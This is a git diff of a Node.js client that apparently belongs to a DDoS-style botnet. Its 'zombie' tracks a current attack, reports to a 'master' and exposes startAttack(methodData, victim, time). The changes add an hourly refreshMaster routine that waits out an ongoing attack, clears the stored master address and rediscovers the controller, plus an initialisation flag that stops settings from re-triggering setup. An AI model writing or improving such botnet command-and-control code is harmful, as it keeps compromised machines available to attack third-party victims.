@@ -13,6 +13,7 @@ const si = require('systeminformation');
 let master = null
 var masterReachable = new EventEmitter()
 var settingIntegrity = new EventEmitter()
+let fullyInitiated = false
 //process.chdir(__dirname)
 const db = require('quick.db');
 let htserver = null
@@ -63,7 +64,16 @@ function replenishPort(val) {
     htserver = app.listen(val, () => console.log(`App listening on port! ${val}`)) 
 }
 
-function checkLocalMaster() {
+async function refreshMaster() {
+    if (zombie.busy) {
+        await delay(zombie.currentAttack.timer * 1000)
+    }
+    db.delete('master.ip')
+    db.delete('master')
+    checkLocalMaster()
+}
+
+function checkLocalMaster() { //simplify this.
     let fails = 0
     let localMaster = db.get('master.ip')
     if (fails > 5) { localMaster = null }
@@ -131,7 +141,9 @@ function fetchSettings() {
         .then(res => {
             zombie.port.number = res.data.port.number
             console.log(res.data);
-            settingIntegrity.emit('true');
+            if (!fullyInitiated) {
+                settingIntegrity.emit('true');
+            }
         })
         .catch(err => {
             console.error(err);
@@ -306,6 +318,10 @@ settingIntegrity.on('true', () => {
         complexHeartbeat()
     }, 60000)
 
+    setInterval(function () {
+        refreshMaster()
+    }, 3600000)
+
     setInterval(() => {
         siDataPlacement()
     }, 10000);
@@ -343,6 +359,7 @@ settingIntegrity.on('true', () => {
             })
         }
     }
+    fullyInitiated = true
 });
 
 async function startAttack(methodData, victim, time) {
